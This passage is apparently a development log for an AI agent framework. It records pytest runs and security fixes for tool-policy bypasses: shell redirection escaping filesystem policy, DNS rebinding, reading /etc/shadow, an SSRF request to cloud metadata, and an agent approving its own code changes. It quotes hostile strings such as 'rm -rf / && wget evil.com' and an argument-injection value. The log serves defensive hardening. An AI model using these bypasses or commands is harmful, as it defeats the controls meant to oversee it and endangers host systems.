  observed on the first attempt — confirmed via `git show HEAD~5` that
  this test file predates this session's changes entirely and always
  uses empty network allowlists, so it never touches any code this
  session modified; re-run passed clean)
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20838 passed, 13 skipped, 3 deselected in 491.43s (0:08:11)`
  — 6 more passing than the prior (SR-1.7) checkpoint's 20832, matching
  the tests added this checkpoint exactly (3 pre-existing tests that
  hardcoded the total pattern count were updated in place, not added);
  no regressions.

---

## Run: 2026-07-10 12:55 UTC — validation-harness overhaul, SR-1.7 (shell redirection bypassed filesystem policy)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `ShellPolicyEngine.check_command()` only validated program
  names; redirection operators (`>`, `>>`, `<`, etc.) were never parsed
  or routed through `FilesystemPolicyEngine`.
- Live reproduction via the real, unmocked production `shell_exec` tool
  through `ToolRegistry` (not a theoretical gap): with only `"echo"`
  allowlisted and `allowed_write_paths` empty,
  `shell_exec(command="echo pwned > /tmp/.../not_allowed/pwn.txt")`
  returned `success: True` and **the file was genuinely created on
  disk** with content `"pwned"`. Confirmed fixed: the identical call now
  returns `success: False` with `"Filesystem write denied"`, and the
  file is never created.
- Fix: `ShellPolicyEngine.extract_redirect_targets()` tokenises with
  POSIX-punctuation-aware `shlex` so `>`/`>>`/`<` etc. are recognised
  with or without surrounding whitespace, correctly excluding
  fd-duplication forms (`2>&1`, `>&2`).
  `PolicyEngine.check_shell()` routes every extracted target through
  `filesystem.check_write()`/`check_read()` after the program-name check
  passes.
- **Bug found and fixed in the same checkpoint:** the pre-existing
  chain-operator splitting regex treated `&` in `2>&1`/`>&2`/`<&0` as
  the background-execution operator, denying the common `2>&1` idiom
  outright even with the command correctly allowlisted (confirmed
  pre-existing via `git stash`: `echo hi 2>&1` with `echo` allowlisted →
  `"Shell command denied: '1' is not in the allowed commands list"`).
  Fixed with a negative lookbehind excluding `&` preceded by `<`/`>`.
- Command: `pytest tests/policy/test_shell.py tests/policy/test_engine.py -q`
- Result: `95 passed` (26 new tests: 18 in `test_shell.py`, 8 in
  `test_engine.py`)
- Command: `pytest tests/policy/ tests/tools/ tests/integration/ tests/security/ tests/unit/ -q`
- Result: `6968 passed, 2 skipped`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20832 passed, 13 skipped, 3 deselected in 472.05s (0:07:52)`
  — 26 more passing than the prior (SR-1.9a) checkpoint's 20806,
  matching the tests added this checkpoint exactly; no regressions.

---

## Run: 2026-07-10 12:10 UTC — validation-harness overhaul, SR-1.9a (network policy allowlisted-host DNS-rebinding gap)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `NetworkPolicyEngine.check_host()`'s exact-hostname
  (`allowed_hosts`) and domain-suffix (`allowed_domains`) matches
  returned `allow` immediately with zero IP verification — the
  DNS-rebinding defense only ran for hostnames matching neither list.
  Two pre-existing tests
  (`test_exact_host_match_does_not_call_dns`,
  `test_domain_match_does_not_call_dns`) explicitly asserted this as
  correct — same "vulnerable behavior encoded as a passing test"
  pattern as SR-1.8.
- Live reproduction: with `allowed_hosts=["build.corp.example.com"]`
  and a fake resolver configured to raise `AssertionError` if ever
  invoked, `check_host("build.corp.example.com")` returned `True`
  **without the resolver ever being called**. Confirmed fixed: the same
  scenario with a resolver returning `10.0.0.5` now raises
  `PolicyViolationError` mentioning "rebinding".
- Fix: extracted the existing step-5 rebinding-check logic into a
  shared `_resolve_and_check_rebinding()` helper, applied uniformly to
  the name-match steps (3/4) as well as the no-match fallback (5). DNS
  resolution failure (`OSError`) still allows a name match through
  (nothing to rebind if there's no live DNS record).
- Command: `pytest tests/policy/test_network.py tests/policy/test_network_edges.py -q`
- Result: `192 passed` (6 tests rewritten in
  `TestShortCircuitBehaviour` — 2 renamed to reflect new behavior, 4 new)
- **Performance regression caught and fixed in the same checkpoint:**
  6 Hypothesis property tests in `tests/policy/test_policy_property.py`
  (`TestNetworkDomainMatching`, `TestNetworkAllowedHosts`) generate
  random hostnames as allowlist entries without mocking DNS — after
  this fix, each of up to 100 examples/test performed a real,
  unmocked `getaddrinfo()` call, pushing
  `tests/policy/+tests/gateway/+tests/security/` from 75.56s to
  382.66s (confirmed via direct pre/post timing comparison). Fixed by
  mocking DNS to raise `OSError` in those 6 tests (matching this same
  file's existing pattern for its deny-path tests). Re-verified:
  `tests/policy/+tests/gateway/+tests/security/` → `3040 passed in
  68.53s` (in line with the 75.56s baseline).
- **One additional real regression found and fixed via the full-suite
  run:** `tests/unit/test_policy_gateway_edges.py::TestPolicyHTTPClientEdgeCases::test_url_with_unusual_port_host_matched_by_allowed_hosts`
  used the literal hostname `"internal.corp.com"` as an `allowed_hosts`
  entry without mocking DNS; that hostname has a real DNS record
  resolving to `127.0.53.53` (ICANN's name-collision warning sentinel,
  a loopback address) in this sandbox — correctly triggering the new
  rebinding check as a genuine private/loopback address. Fixed by
  mocking DNS to fail for this test too, removing the unintended live
  DNS dependency (not weakening the test — it was never testing DNS
  behavior, only that unusual-port URLs match policy correctly).
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20806 passed, 13 skipped, 3 deselected in 466.52s (0:07:46)`
  — 4 more passing than the prior (SR-1.4) checkpoint's 20802, matching
  the net new tests added in `test_network_edges.py` (2 renamed +
  4 new); the mocking fixes in `test_policy_property.py` and
  `test_policy_gateway_edges.py` modified existing tests without adding
  new ones. Runtime back in line with prior checkpoints, confirming the
  performance regression was fully resolved before this run.

---

## Run: 2026-07-10 11:25 UTC — validation-harness overhaul, SR-1.4 (vision_capture/vision_burst filesystem permission mismatch)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `VisionCaptureTool` declared
  `ToolPermissions(filesystem_read=True, filesystem_write=True)` but
  reads its target from a `source` kwarg and writes to `save_path`
  (also reads `device`) — none of which match the registry's generic
  `path`/`file_path`/`target`/`destination` heuristic, so the declared
  permissions enforced nothing. Same architectural pattern as SR-1.5,
  in the tool the review names explicitly.
- Live reproduction (real registry+policy stack, not mocks): with
  nothing filesystem-allowlisted,
  `vision_capture(source="/etc/shadow", save_path="/tmp/exfil.jpg")`
  passed the registry's permission check with zero denial, and the tool
  actually called `cv2.imread("/etc/shadow")` — failed only because
  `/etc/shadow` isn't a valid image format, not because of any policy
  gate. Confirmed fixed: same call now denied with `"Filesystem read
  denied: '/etc/shadow' is not within an allowed read path"`.
- Fix: reused SR-1.5's `resolve_filesystem_targets()` hook (no new
  mechanism needed). `VisionCaptureTool` resolves `source` as a read
  target (unless a non-path sentinel like `"webcam"`), `device` as an
  additional read target, and `save_path` as the write target (falling
  back to the same fixed `~/.missy/captures/` default `execute()` uses
  when omitted). `VisionBurstCaptureTool` resolves `device` as a read
  target and only declares a write target when `best_only=True`,
  matching that its non-best-only branch never writes to disk.
- Command: `pytest tests/vision/ tests/tools/ tests/policy/ -q`
- Result: `5080 passed, 2 skipped` (3 known pre-existing
  `CameraDiscovery` cache-TTL failures, unrelated — same run also
  covers `tests/tools/`/`tests/policy/`, all passing); 14 new tests in
  `tests/vision/test_vision_tools.py`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20802 passed, 13 skipped, 3 deselected in 443.85s (0:07:23)`
  — 14 more passing than the prior (SR-1.6) checkpoint's 20788, matching
  the tests added this checkpoint; no regressions.

---

## Run: 2026-07-10 10:55 UTC — validation-harness overhaul, SR-1.6 (Playwright bypassed the network gateway — crown-jewel finding)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `BrowserNavigateTool` called Playwright's `page.goto(url)`
  directly with zero routing through `PolicyHTTPClient` or the network
  policy engine, unlike every other network-permission tool
  (`web_fetch`, Discord upload) in the codebase. The registry itself had
  no dynamic host-checking mechanism for network permissions at all —
  only a static, always-empty `allowed_hosts` list.
- Live reproduction (real registry+policy stack, not mocks):
  `NetworkPolicy()` (nothing allowlisted) →
  `browser_navigate(url="http://169.254.169.254/latest/meta-data/")` —
  the cloud-metadata SSRF target the review names explicitly — **passed
  the registry's permission check** with zero denial, proceeding
  straight to Playwright (failed only for the unrelated pre-existing
  reason that this sandbox has no `playwright` package installed).
  Confirmed fixed: same call now denied with `"Network access denied:
  '169.254.169.254' is not in an allowed CIDR block"`.
- Fix (two layers): (1) `BaseTool.resolve_network_hosts()` hook (mirrors
  SR-1.5's `resolve_shell_command`/`resolve_filesystem_targets`
  pattern) — `BrowserNavigateTool` overrides it to extract the target
  host from `url`; the registry checks it before Playwright is ever
  touched. (2) `context.route("**/*", ...)` interception registered on
  every browser session, gating navigation, redirects, subresources,
  and JS-triggered `fetch()`/XHR (via `browser_evaluate`) against the
  same policy engine — the part of the review's finding ("every
  subresource/redirect/fetch inside Firefox is outside the Python
  gateway too") a top-level-only check would have missed.
- Command: `pytest tests/tools/test_browser_tools_gaps.py tests/tools/ tests/policy/ -q`
- Result: `2123 passed, 2 skipped` (18 new tests in
  `tests/tools/test_browser_tools_gaps.py` — see `AUDIT_SECURITY.md`'s
  `### SR-1.6` section for the full breakdown)
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20788 passed, 13 skipped, 3 deselected in 446.47s (0:07:26)`
  — 18 more passing than the prior (SR-1.5) checkpoint's 20770, matching
  the tests added this checkpoint; no regressions.

---

## Run: 2026-07-10 10:05 UTC — validation-harness overhaul, SR-1.5 (Incus declaration/dispatch mismatch)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `ToolRegistry._check_permissions()` derived the checked shell
  command from `kwargs.get("command", "shell")`; 14 of 15 Incus tools
  have no `command` kwarg (checked the meaningless literal `"shell"`
  instead of the real `incus` binary), and `incus_exec`'s `command`
  kwarg names the guest command, not the host binary. `incus_file`
  declared `shell=True` only, so its `host_path` was never checked
  against the filesystem policy.
- Live reproduction (real registry+policy+subprocess stack, not mocks):
  `ShellPolicy(enabled=True, allowed_commands=["bash"])` →
  `incus_exec(instance="victim-container", command="bash")` **passed
  policy** and executed `["incus", "exec", "victim-container", "--",
  "bash", "-c", "bash"]` on the host — `incus` was never allowlisted.
  Confirmed fixed: same call now denied with `"'incus' is not in the
  allowed commands list"`.
- Fix: added `BaseTool.resolve_shell_command()` /
  `resolve_filesystem_targets()` hooks; registry uses them when a tool
  overrides either, falling back to the exact prior heuristic otherwise
  (verified: zero behavior change for tools that don't opt in). All 15
  Incus tool classes declare the real host command (`"incus"`);
  `IncusFileTool` now declares filesystem permissions and resolves
  `host_path` to the correct read/write direction.
- Command: `pytest tests/tools/ tests/policy/ -q`
- Result: `2105 passed, 2 skipped` (15 new tests: 4 in
  `test_registry_hardening.py`, 11 in `test_incus_tools.py` — see
  `AUDIT_SECURITY.md`'s `### SR-1.5` section for the full breakdown)
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20770 passed, 13 skipped, 3 deselected in 448.20s (0:07:28)`
  — 15 more passing than the prior (SR-1.8) checkpoint's 20755, matching
  the tests added this checkpoint; no regressions.

---

## Run: 2026-07-10 09:10 UTC — validation-harness overhaul, SR-1.8 (shell default-deny — critical)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: `ShellPolicyEngine.check_command()` treated an empty
  `allowed_commands` list as allow-all whenever `enabled=True` —
  directly contradicting `ShellPolicy`'s own docstring and all
  operator-facing docs, which already correctly promised deny-all. A
  pre-existing test literally asserted `rm -rf / && wget evil.com`
  passed policy under the default empty-allowlist config.
- Fix: `check_command()` now raises `PolicyViolationError` when
  `allowed_commands` is empty.
- Command: `pytest tests/policy/ tests/unit/test_shell_policy_compound_commands.py tests/integration/test_policy_enforcement.py tests/integration/test_end_to_end.py -q`
- Result: `815 passed` (4 pre-existing tests fixed from asserting the
  vulnerable behavior to asserting the correct fail-closed behavior; 1
  new test added)
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20755 passed, 13 skipped, 3 deselected in 460.03s (0:07:40)`
  — no other hidden dependencies on the old behavior found anywhere in
  the codebase.

---

## Run: 2026-07-10 08:40 UTC — validation-harness overhaul, FX-G (bound/decompose long acpx work)

- Branch: `overhaul/missy-validation-20260710-031406`
- Added `_MAX_TIMEOUT_SECONDS = 600` hard ceiling on configured acpx
  timeout, with a warning log when clamped. Improved the timeout
  `ProviderError` message to state the outcome is UNKNOWN and instruct
  fresh verification + idempotent retries.
- Attempted a `Popen`-based process-group-kill rewrite of `_run_acpx`/
  `stream()` for FX-G bullet 2's subprocess-cleanup ask; reverted after
  confirming (via a hung/background test run, killed manually) that it
  broke ~136 existing tests mocking `subprocess.run`. Tracked as task
  #17 for a dedicated future session with the necessary test migration.
- Command: `pytest tests/providers/test_acpx_provider.py -q` (with a
  hard 60s wall-clock guard to catch any subprocess-mock regression
  immediately)
- Result: `141 passed in 0.88s` (was 137 before this checkpoint)
- Command: `pytest tests/providers/ -q`
- Result: `890 passed in 24.93s`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20754 passed, 13 skipped, 3 deselected in 447.40s (0:07:27)`

---

## Run: 2026-07-10 08:10 UTC — validation-harness overhaul, FX-F bullet 1 (browser diagnostics)

- Branch: `overhaul/missy-validation-20260710-031406`
- Added `_classify_browser_error()` in
  `missy/tools/builtin/browser_tools.py` distinguishing missing
  playwright, browser-binary-not-installed, and sandbox/kernel launch
  failure (the harness's exact two observed error strings) from generic
  interaction errors. Remediation text explicitly forbids
  `--no-sandbox`/`SYS_ADMIN`/privileged containers.
- Command: `pytest tests/tools/test_browser_tools_gaps.py tests/unit/test_browser_session_id_validation.py -q`
- Result: `37 passed`
- Command: `pytest tests/tools/ -q`
- Result: `1470 passed, 2 skipped`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20750 passed, 13 skipped, 3 deselected in 447.53s (0:07:27)`
- Live-verified: this dev sandbox has no `playwright` package installed
  and cannot launch a real browser — same environment limitation the
  validation harness observed. `_classify_browser_error()` correctly
  returns the specific install-guidance message rather than a generic
  failure.
- FX-F bullets 2/4 (disposable browser-test environment, WB-002..007 +
  XT-001 rerun) deferred as real infrastructure work — tracked as
  task #16.

---

## Run: 2026-07-10 07:40 UTC — validation-harness overhaul, FX-C (grounding factual state claims)

- Branch: `overhaul/missy-validation-20260710-031406`
- Memory ID lookups: added exception-vs-not-found distinction in
  `memory_describe`/`memory_expand` (4 call sites).
- Incus tools: confirmed and locked in with tests that `incus_list`/
  `incus_network(list)` are exact deterministic JSON passthroughs (no
  tool-layer fabrication possible).
- Added envelope rule 6 (`missy/providers/acpx_provider.py`) forbidding
  the delegate from padding/altering structured tool results.
- Command: `pytest tests/tools/ tests/memory/ -q`
- Result: `2059 passed, 9 skipped`
- Command: `pytest tests/providers/test_acpx_provider.py -q`
- Result: `137 passed`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20742 passed, 13 skipped, 3 deselected in 448.39s (0:07:28)`
- New tests: 10 in `tests/tools/test_incus_tools.py`
  (`TestIncusListExactRowPreservation`,
  `TestIncusNetworkListExactRowPreservation`), 8 in
  `tests/tools/test_memory_tools.py`
  (`TestMemoryDescribeExceptionVsNotFound`,
  `TestMemoryExpandExceptionVsNotFound`), 1 in
  `tests/providers/test_acpx_provider.py`.

---

## Run: 2026-07-10 07:00 UTC — validation-harness overhaul, SR-1.13 (Discord ingress authorization, 2 critical findings)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding 1: `_handle_message()` dispatched voice/image/screencast
  commands before DM/guild authorization ran.
- Finding 2 (more severe): `_handle_interaction()` (slash commands) had
  no authorization check at all, plus `_handle_ask()` hardcoded a
  shared `session_id="discord"` across all users.
- Command: `pytest tests/channels/ -q`
- Result: `1931 passed` (was 1925 before finding 1's fix, 1915 before
  this session's SR-1.12 fix)
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20727 passed, 13 skipped, 3 deselected in 450.43s (0:07:30)`
- New tests: 11 in
  `tests/channels/test_discord_channel_gap_coverage.py::TestUniformIngressAuthorizationSR113`,
  6 in
  `tests/channels/test_discord_channel_coverage.py::TestHandleInteractionAuthorizationSR113`,
  8 in `tests/unit/test_discord_commands_coverage.py` (author-ID
  extraction + per-user session isolation).

---

## Run: 2026-07-10 06:00 UTC — validation-harness overhaul, FX-D (structural boundary + fail-closed)

- Branch: `overhaul/missy-validation-20260710-031406`
- Added explicit `_CURRENT_TURN_BOUNDARY` marker line inserted by
  `_build_prompt()` before the final message; `complete()`/
  `complete_with_tools()` now raise `ProviderError` instead of silently
  returning an empty response when a leaked transcript marker strips
  away the entire delegate output.
- Command: `pytest tests/providers/test_acpx_provider.py -q`
- Result: `136 passed` (was 120 before this checkpoint; +16 net new
  tests across boundary placement/tracking, quoted-text safety,
  multiline/long-history, malicious-history-instruction confinement,
  DISC-CMD-006 + report-followup end-to-end with both defenses active,
  and fail-closed/partial-leak behavior)
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20703 passed, 13 skipped, 3 deselected in 456.40s (0:07:36)`

---

## Run: 2026-07-10 05:10 UTC — validation-harness overhaul, FX-E + SR-1.2/1.3 (critical)

- Branch: `overhaul/missy-validation-20260710-031406`
- Finding: live, unauthenticated code-self-approval vulnerability.
  Default system prompt instructed the agent to approve/apply its own
  code changes via `code_evolve`; `CodeEvolutionManager.approve()`/
  `apply()`/`rollback()` perform no authentication. A second,
  independent instance existed in Discord's ✅ reaction handler (any
  Discord user could approve, no admin check).
- Command: `pytest tests/tools/ tests/agent/ tests/channels/ tests/security/ -q`
- Result: `9530 passed, 6 skipped`
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing vision failures deselected
- Result: `20686 passed, 13 skipped, 3 deselected in 447.60s (0:07:27)`
- Updated ~15 tests across `tests/tools/test_code_evolve.py`,
  `tests/tools/test_code_evolve_gap_coverage.py`,
  `tests/security/test_self_create_tool_script_validation.py`, and
  `tests/channels/test_discord_evolution_reactions.py` from the old
  (now-removed) tool-level approve/apply/rollback behavior to the new
  refusal contract. New assertions confirm `CodeEvolutionManager` is
  never constructed by the tool for approve/apply/rollback, and that
  Discord's approve-reaction path emits a `deny` audit event without
  ever calling `mgr.approve()`.

---

## Run: 2026-07-10 04:20 UTC — validation-harness overhaul, FX-B (memory backend fix)

- Branch: `overhaul/missy-validation-20260710-031406`
- Root cause: `AgentRuntime._make_memory_store()` returned the JSON
  `MemoryStore` (`~/.missy/memory.json`) instead of `SQLiteMemoryStore`
  (`~/.missy/memory.db`), which every other production consumer already
  assumed. Same bug independently present in
  `VisionMemoryBridge.store_observation()`.
- Command: `pytest tests/integration/test_discord_memory_persistence.py tests/agent/test_coverage_gaps.py tests/vision/ -q`
- Result: `3041 passed`, 3 failed (pre-existing `CameraDiscovery`
  cache-TTL bug, unrelated, tracked separately)
- Command: `pytest tests/ -q -o faulthandler_timeout=120` with the 3
  known pre-existing failures deselected
- Result: `20701 passed, 13 skipped, 3 deselected in 452.13s (0:07:32)`
- New test file: `tests/integration/test_discord_memory_persistence.py`
  (8 tests) — real on-disk `SQLiteMemoryStore`, no memory-layer mocking,
  drives `AgentRuntime.run()` the same way Discord's channel handler
  does. Covers basic persistence, retrieval via
  `get_recent_turns`/`get_session_turns`/`search`, restart/resume across
  a fresh runtime instance on the same db file, concurrent multi-channel
  isolation, failed-provider-call behavior, and session-id derivation.
- ~30 pre-existing test assertions across 8 vision test files and
  `tests/agent/test_coverage_gaps.py` updated from the old (incorrect)
  kwargs-call assertion pattern to the real object-based
  `SQLiteMemoryStore.add_turn(turn)` contract — those assertions
  previously passed only because they mocked `add_turn` with a bare
  `MagicMock()` that silently accepted any call shape, which is exactly
  how the underlying persistence bug shipped undetected.

---

## Run: 2026-07-10 03:xx UTC — validation-harness overhaul, FX-A slice 1

- Branch: `overhaul/missy-validation-20260710-031406`
- Command: `pytest tests/channels/discord/test_voice_commands.py tests/providers/test_acpx_provider.py -q`
- Result: `157 passed`
- Command: `pytest tests/providers/ tests/agent/ -q`
- Result: `4995 passed, 4 skipped in 78.27s`
- Command: `pytest -q -o faulthandler_timeout=120` (full suite)
- Result: `20692 passed, 3 failed, 13 skipped in 490.29s (0:08:10)`
  - Failures: `tests/vision/test_discovery_capture_sysfs.py::TestCacheTTL::test_cache_valid_within_ttl`,
    `tests/vision/test_discovery_edge_cases.py::TestPermissionDeniedOnDevice::test_device_that_does_not_exist_is_skipped`,
    `tests/vision/test_discovery_edge_cases.py::TestRapidAddRemove::test_cached_results_returned_within_ttl`.
    Confirmed pre-existing via `git stash` (fail identically on the
    pre-session tree); `CameraDiscovery` cache-TTL logic bug, unrelated
    to acpx/voice changes. Not fixed this session — tracked as a
    follow-up so this checkpoint's commits stay scoped.
- `ruff check` / `ruff format --check` on touched files: all clean.
- Live smoke test against the real installed `acpx@0.3.1` binary
  (`--version`/`--help` only, no LLM calls): `is_available() == True`,
  isolated sandbox cwd created at `~/.missy/acpx_sandbox` (mode 0700).
  Constructed argv verified with a hostile
  `base_url="--approve-all --cwd /evil --verbose"` config: only
  `--verbose` reached the subprocess; forced `--allowed-tools ""` /
  `--non-interactive-permissions deny` / `--cwd
  ~/.missy/acpx_sandbox` were present and last-wins.

**Baseline preserved below.** The 2026-07-09/10 validation-harness run
found 43/89 tool-specific validation cases failing (see `~/fixes.md`,
`BUILD_STATUS.md`); this run does not yet re-exercise that harness
(requires live delegate invocation) — it is unit/integration coverage
for the FX-A code change only.

---

## Run: 2026-07-09 15:28:21 (prior workstream: tool intelligence overhaul)

- Timestamp: 2026-07-09 15:28:21
- Command: pytest -q

```
........................................................................ [  0%]
........................................................................ [  0%]
........................................................................ [  1%]
........................................................................ [  1%]
........................................................................ [  1%]
........................................................................ [  2%]
........................................................................ [  2%]
........................................................................ [  2%]
........................................................................ [  3%]
........................................................................ [  3%]
........................................................................ [  3%]
........................................................................ [  4%]
........................................................................ [  4%]
........................................................................ [  4%]
........................................................................ [  5%]
........................................................................ [  5%]
........................................................................ [  5%]
........................................................................ [  6%]
........................................................................ [  6%]
........................................................................ [  6%]
........................................................................ [  7%]
........................................................................ [  7%]
........................................................................ [  8%]
........................................................................ [  8%]
........................................................................ [  8%]
........................................................................ [  9%]
........................................................................ [  9%]
........................................................................ [  9%]
........................................................................ [ 10%]
........................................................................ [ 10%]
........................................................................ [ 10%]
........................................................................ [ 11%]
........................................................................ [ 11%]
........................................................................ [ 11%]
........................................................................ [ 12%]
........................................................................ [ 12%]
........................................................................ [ 12%]
........................................................................ [ 13%]
........................................................................ [ 13%]
........................................................................ [ 13%]
........................................................................ [ 14%]
........................................................................ [ 14%]
........................................................................ [ 14%]
........................................................................ [ 15%]
........................................................................ [ 15%]
........................................................................ [ 16%]
............................................................ssss........ [ 16%]
........................................................................ [ 16%]
........................................................................ [ 17%]
........................................................................ [ 17%]
........................................................................ [ 17%]
........................................................................ [ 18%]
........................................................................ [ 18%]
........................................................................ [ 18%]
........................................................................ [ 19%]
........................................................................ [ 19%]
........................................................................ [ 19%]
........................................................................ [ 20%]
........................................................................ [ 20%]
........................................................................ [ 20%]
........................................................................ [ 21%]
........................................................................ [ 21%]
........................................................................ [ 21%]
........................................................................ [ 22%]
........................................................................ [ 22%]
........................................................................ [ 22%]
........................................................................ [ 23%]
........................................................................ [ 23%]
........................................................................ [ 24%]
........................................................................ [ 24%]
........................................................................ [ 24%]
........................................................................ [ 25%]
........................................................................ [ 25%]
........................................................................ [ 25%]
........................................................................ [ 26%]
........................................................................ [ 26%]
........................................................................ [ 26%]
........................................................................ [ 27%]
........................................................................ [ 27%]
........................................................................ [ 27%]
........................................................................ [ 28%]
........................................................................ [ 28%]
........................................................................ [ 28%]
........................................................................ [ 29%]
........................................................................ [ 29%]
........................................................................ [ 29%]
........................................................................ [ 30%]
........................................................................ [ 30%]
........................................................................ [ 31%]
........................................................................ [ 31%]
........................................................................ [ 31%]
........................................................................ [ 32%]
........................................................................ [ 32%]
........................................................................ [ 32%]
........................................................................ [ 33%]
........................................................................ [ 33%]
........................................................................ [ 33%]
........................................................................ [ 34%]
........................................................................ [ 34%]
........................................................................ [ 34%]
........................................................................ [ 35%]
........................................................................ [ 35%]
........................................................................ [ 35%]
........................................................................ [ 36%]
........................................................................ [ 36%]
........................................................................ [ 36%]
........................................................................ [ 37%]
........................................................................ [ 37%]
........................................................................ [ 37%]
........................................................................ [ 38%]
........................................................................ [ 38%]
........................................................................ [ 39%]
........................................................................ [ 39%]
........................................................................ [ 39%]
........................................................................ [ 40%]
........................................................................ [ 40%]
........................................................................ [ 40%]
........................................................................ [ 41%]
........................................................................ [ 41%]
........................................................................ [ 41%]
........................................................................ [ 42%]
........................................................................ [ 42%]
........................................................................ [ 42%]
........................................................................ [ 43%]
........................................................................ [ 43%]
........................................................................ [ 43%]
........................................................................ [ 44%]
........................................................................ [ 44%]
........................................................................ [ 44%]
........................................................................ [ 45%]
........................................................................ [ 45%]
........................................................................ [ 45%]
........................................................................ [ 46%]
........................................................................ [ 46%]
........................................................................ [ 47%]
...................................................sssssss.............. [ 47%]
........................................................................ [ 47%]
........................................................................ [ 48%]
........................................................................ [ 48%]
........................................................................ [ 48%]
........................................................................ [ 49%]
........................................................................ [ 49%]
........................................................................ [ 49%]
........................................................................ [ 50%]
........................................................................ [ 50%]
........................................................................ [ 50%]
........................................................................ [ 51%]
........................................................................ [ 51%]
........................................................................ [ 51%]
........................................................................ [ 52%]
........................................................................ [ 52%]
........................................................................ [ 52%]
........................................................................ [ 53%]
........................................................................ [ 53%]
........................................................................ [ 53%]
........................................................................ [ 54%]
........................................................................ [ 54%]
........................................................................ [ 55%]
........................................................................ [ 55%]
........................................................................ [ 55%]
........................................................................ [ 56%]
........................................................................ [ 56%]
........................................................................ [ 56%]
........................................................................ [ 57%]
........................................................................ [ 57%]
........................................................................ [ 57%]
........................................................................ [ 58%]
........................................................................ [ 58%]
........................................................................ [ 58%]
........................................................................ [ 59%]
........................................................................ [ 59%]
........................................................................ [ 59%]
........................................................................ [ 60%]
........................................................................ [ 60%]
........................................................................ [ 60%]
........................................................................ [ 61%]
........................................................................ [ 61%]
........................................................................ [ 62%]
........................................................................ [ 62%]
........................................................................ [ 62%]
........................................................................ [ 63%]
........................................................................ [ 63%]
........................................................................ [ 63%]
........................................................................ [ 64%]
........................................................................ [ 64%]
........................................................................ [ 64%]
........................................................................ [ 65%]
........................................................................ [ 65%]
........................................................................ [ 65%]
........................................................................ [ 66%]
........................................................................ [ 66%]
........................................................................ [ 66%]
........................................................................ [ 67%]
........................................................................ [ 67%]
........................................................................ [ 67%]
........................................................................ [ 68%]
........................................................................ [ 68%]
........................................................................ [ 68%]
........................................................................ [ 69%]
........................................................................ [ 69%]
........................................................................ [ 70%]
........................................................................ [ 70%]
........................................................................ [ 70%]
...............................................................ss....... [ 71%]
........................................................................ [ 71%]
........................................................................ [ 71%]
........................................................................ [ 72%]
........................................................................ [ 72%]
........................................................................ [ 72%]
........................................................................ [ 73%]
........................................................................ [ 73%]
........................................................................ [ 73%]
........................................................................ [ 74%]
........................................................................ [ 74%]
........................................................................ [ 74%]
........................................................................ [ 75%]
........................................................................ [ 75%]
........................................................................ [ 75%]
........................................................................ [ 76%]
........................................................................ [ 76%]
........................................................................ [ 76%]
........................................................................ [ 77%]
........................................................................ [ 77%]
........................................................................ [ 78%]
........................................................................ [ 78%]
........................................................................ [ 78%]
........................................................................ [ 79%]
........................................................................ [ 79%]
........................................................................ [ 79%]
........................................................................ [ 80%]
........................................................................ [ 80%]
........................................................................ [ 80%]
........................................................................ [ 81%]
........................................................................ [ 81%]
........................................................................ [ 81%]
........................................................................ [ 82%]
........................................................................ [ 82%]
........................................................................ [ 82%]
........................................................................ [ 83%]
........................................................................ [ 83%]
........................................................................ [ 83%]
........................................................................ [ 84%]
........................................................................ [ 84%]
........................................................................ [ 84%]
........................................................................ [ 85%]
........................................................................ [ 85%]
........................................................................ [ 86%]
........................................................................ [ 86%]
........................................................................ [ 86%]
........................................................................ [ 87%]
........................................................................ [ 87%]
........................................................................ [ 87%]
........................................................................ [ 88%]
........................................................................ [ 88%]
........................................................................ [ 88%]
........................................................................ [ 89%]
........................................................................ [ 89%]
........................................................................ [ 89%]
........................................................................ [ 90%]
........................................................................ [ 90%]
........................................................................ [ 90%]
........................................................................ [ 91%]
........................................................................ [ 91%]
........................................................................ [ 91%]
........................................................................ [ 92%]
........................................................................ [ 92%]
........................................................................ [ 93%]
........................................................................ [ 93%]
........................................................................ [ 93%]
........................................................................ [ 94%]
........................................................................ [ 94%]
........................................................................ [ 94%]
........................................................................ [ 95%]
........................................................................ [ 95%]
........................................................................ [ 95%]
........................................................................ [ 96%]
........................................................................ [ 96%]
........................................................................ [ 96%]
........................................................................ [ 97%]
........................................................................ [ 97%]
........................................................................ [ 97%]
........................................................................ [ 98%]
........................................................................ [ 98%]
........................................................................ [ 98%]
........................................................................ [ 99%]
........................................................................ [ 99%]
........................................................................ [ 99%]
.....                                                                    [100%]
20656 passed, 13 skipped in 421.70s (0:07:01)
```
